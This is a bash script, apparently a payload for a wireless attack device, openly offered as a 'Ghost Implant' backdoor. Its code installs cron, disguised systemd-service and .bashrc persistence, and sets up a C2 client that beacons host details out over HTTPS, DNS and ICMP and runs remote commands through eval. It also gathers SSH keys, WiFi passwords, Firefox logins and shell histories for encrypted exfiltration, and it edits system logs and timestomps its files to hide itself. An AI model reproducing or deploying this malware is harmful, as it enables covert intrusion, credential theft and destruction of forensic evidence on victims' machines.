#!/bin/bash
# ============================================================
# NullSec: Ghost Implant - Persistent Wireless Backdoor
# Author: bad-antics
# Description: Stealthy persistent wireless implant with C2 and anti-forensics
# Category: pager/implant
#
# UNIQUE FEATURES:
# - Survives reboots via multiple persistence mechanisms
# - Encrypted C2 communication
# - Anti-forensics and evidence destruction
# - Automatic reconnection & failover
# - Covert data exfiltration
# - Self-updating capability
# ============================================================

PAYLOAD_NAME="Ghost Implant"
VERSION="1.0.0"
LOOT="/root/loot/implant"
LOG="$LOOT/ghost.log"
IMPLANT_ID="GHOST-$(cat /dev/urandom | tr -dc 'a-f0-9' | head -c 8)"

init_payload() {
    mkdir -p "$LOOT"/{staging,exfil,c2,config}
    echo "[$(date)] $PAYLOAD_NAME started - ID: $IMPLANT_ID" >> "$LOG"
    NOTIFY "GHOST" "Implant $IMPLANT_ID initializing..."
}

install_persistence() {
    NOTIFY "PERSIST" "Installing persistence mechanisms..."
    
    local PERSIST_DIR="$LOOT/config"
    
    # Method 1: Cron persistence
    local CRON_CMD="@reboot /bin/bash $LOOT/config/beacon.sh >/dev/null 2>&1"
    (crontab -l 2>/dev/null; echo "$CRON_CMD") | sort -u | crontab - 2>/dev/null
    echo "[PERSIST] Cron installed" >> "$LOG"
    
    # Method 2: Systemd user service
    mkdir -p "$HOME/.config/systemd/user" 2>/dev/null
    cat > "$HOME/.config/systemd/user/network-helper.service" << SVC
[Unit]
Description=Network Helper Service
After=network-online.target
[Service]
Type=simple
ExecStart=/bin/bash $LOOT/config/beacon.sh
Restart=on-failure
RestartSec=60
[Install]
WantedBy=default.target
SVC
    systemctl --user daemon-reload 2>/dev/null
    systemctl --user enable network-helper.service 2>/dev/null
    echo "[PERSIST] Systemd user service installed" >> "$LOG"
    
    # Method 3: .bashrc hook
    HOOK="# network helper\n[ -f $LOOT/config/beacon.sh ] && nohup bash $LOOT/config/beacon.sh &>/dev/null &"
    grep -q "network helper" "$HOME/.bashrc" 2>/dev/null || echo -e "$HOOK" >> "$HOME/.bashrc"
    echo "[PERSIST] Shell hook installed" >> "$LOG"
    
    # Create beacon script
    cat > "$PERSIST_DIR/beacon.sh" << 'BEACON'
#!/bin/bash
BEACON_URL="$1"
INTERVAL="${2:-300}"
while true; do
    HOSTINFO=$(hostname):$(whoami):$(ip addr show 2>/dev/null | grep 'inet ' | grep -v 127 | awk '{print $2}' | head -1)
    ENCODED=$(echo "$HOSTINFO" | base64 | tr -d '\n')
    curl -s -o /dev/null "http://${BEACON_URL}/b?id=${ENCODED}" 2>/dev/null || \
    wget -q -O /dev/null "http://${BEACON_URL}/b?id=${ENCODED}" 2>/dev/null || \
    nslookup "${ENCODED}.beacon.example.com" 2>/dev/null
    sleep $((INTERVAL + RANDOM % 60))
done
BEACON
    chmod +x "$PERSIST_DIR/beacon.sh"
    
    NOTIFY "PERSIST" "3 persistence mechanisms installed"
}

setup_c2() {
    local C2_HOST="$1" C2_PORT="${2:-8443}"
    NOTIFY "C2" "Setting up command & control..."
    
    local C2_DIR="$LOOT/c2"
    
    # C2 beacon with multiple fallback channels
    cat > "$C2_DIR/c2_client.sh" << C2SCRIPT
#!/bin/bash
C2_HOST="$C2_HOST"
C2_PORT="$C2_PORT"
IMPLANT_ID="$IMPLANT_ID"
CHECK_IN_INTERVAL=300

beacon() {
    local DATA="\$(hostname)|\$(whoami)|\$(uname -a)|\$(ip addr show 2>/dev/null | grep 'inet ' | grep -v 127 | awk '{print \$2}')"
    local ENC=\$(echo "\$DATA" | openssl enc -aes-256-cbc -a -salt -pass pass:nullsec 2>/dev/null)
    
    # Primary: HTTPS
    RESP=\$(curl -s -k "https://\${C2_HOST}:\${C2_PORT}/api/beacon" \
        -H "X-Implant-ID: \$IMPLANT_ID" \
        -d "data=\$ENC" 2>/dev/null)
    
    # Fallback: DNS
    if [ -z "\$RESP" ]; then
        RESP=\$(nslookup "\${IMPLANT_ID}.cmd.example.com" 2>/dev/null | grep "Address" | tail -1)
    fi
    
    # Fallback: ICMP
    if [ -z "\$RESP" ]; then
        ping -c 1 -p "\$(echo \$IMPLANT_ID | xxd -p | head -c 32)" "\$C2_HOST" 2>/dev/null
    fi
    
    echo "\$RESP"
}

execute_command() {
    local CMD="\$1"
    case "\$CMD" in
        COLLECT) gather_data ;;
        EXFIL)   exfiltrate ;;
        UPDATE)  self_update ;;
        CLEAN)   self_destruct ;;
        SHELL*)  eval "\${CMD#SHELL }" 2>&1 ;;
    esac
}

while true; do
    RESP=\$(beacon)
    [ -n "\$RESP" ] && execute_command "\$RESP"
    sleep \$((CHECK_IN_INTERVAL + RANDOM % 120))
done
C2SCRIPT
    chmod +x "$C2_DIR/c2_client.sh"
    echo "[C2] Client configured for $C2_HOST:$C2_PORT" >> "$LOG"
}

covert_exfil() {
    NOTIFY "EXFIL" "Setting up covert exfiltration..."
    
    local STAGING="$LOOT/staging"
    
    # Collect high-value data
    # SSH keys
    find /home -name "id_*" -o -name "*.pem" 2>/dev/null | while read -r f; do
        cp "$f" "$STAGING/" 2>/dev/null
    done
    
    # WiFi passwords
    grep -rl "psk=" /etc/NetworkManager/system-connections/ 2>/dev/null | while read -r f; do
        cp "$f" "$STAGING/" 2>/dev/null
    done
    
    # Browser data
    find /home -path "*/.mozilla/firefox/*/logins.json" 2>/dev/null | while read -r f; do
        cp "$f" "$STAGING/firefox_logins_$(basename $(dirname $f)).json" 2>/dev/null
    done
    
    # History files
    find /home -name ".bash_history" -o -name ".zsh_history" 2>/dev/null | while read -r f; do
        USER=$(echo "$f" | cut -d/ -f3)
        cp "$f" "$STAGING/history_${USER}.txt" 2>/dev/null
    done
    
    # Compress and encrypt staging
    tar czf "$LOOT/exfil/data_$(date +%Y%m%d_%H%M).tar.gz" -C "$STAGING" . 2>/dev/null
    openssl enc -aes-256-cbc -salt -in "$LOOT/exfil/data_$(date +%Y%m%d_%H%M).tar.gz" \
        -out "$LOOT/exfil/data_$(date +%Y%m%d_%H%M).enc" -pass pass:nullsec 2>/dev/null
    
    FILES=$(ls "$STAGING" 2>/dev/null | wc -l)
    SIZE=$(du -sh "$LOOT/exfil/" 2>/dev/null | awk '{print $1}')
    echo "[EXFIL] Staged $FILES files ($SIZE)" >> "$LOG"
    NOTIFY "EXFIL" "Staged $FILES files ($SIZE)"
}

anti_forensics() {
    NOTIFY "ANTIFORENSICS" "Covering tracks..."
    
    # Clear shell history
    history -c 2>/dev/null
    
    # Remove our log entries from syslog
    sed -i "/ghost\|implant\|beacon/Id" /var/log/syslog 2>/dev/null
    sed -i "/ghost\|implant\|beacon/Id" /var/log/auth.log 2>/dev/null
    
    # Timestomp our files
    find "$LOOT" -type f -exec touch -t 202301010000.00 {} \; 2>/dev/null
    
    # Clear DNS cache
    systemd-resolve --flush-caches 2>/dev/null
    
    echo "[ANTIFORENSICS] Tracks covered" >> "$LOG"
}

self_destruct() {
    NOTIFY "DESTRUCT" "Self-destructing..."
    
    # Remove persistence
    crontab -l 2>/dev/null | grep -v "beacon.sh" | crontab - 2>/dev/null
    systemctl --user disable network-helper.service 2>/dev/null
    rm -f "$HOME/.config/systemd/user/network-helper.service" 2>/dev/null
    sed -i '/network helper/,+1d' "$HOME/.bashrc" 2>/dev/null
    
    # Secure delete all evidence
    find "$LOOT" -type f -exec shred -vfz -n 3 {} \; 2>/dev/null
    rm -rf "$LOOT" 2>/dev/null
    
    echo "Ghost implant removed"
}

main() {
    init_payload
    install_persistence
    setup_c2 "10.0.0.1" 8443
    covert_exfil
    anti_forensics
    
    TOTAL=$(find "$LOOT" -type f 2>/dev/null | wc -l)
    NOTIFY "DONE" "Ghost implant active: $TOTAL artifacts, ID: $IMPLANT_ID"
}

main "$@"
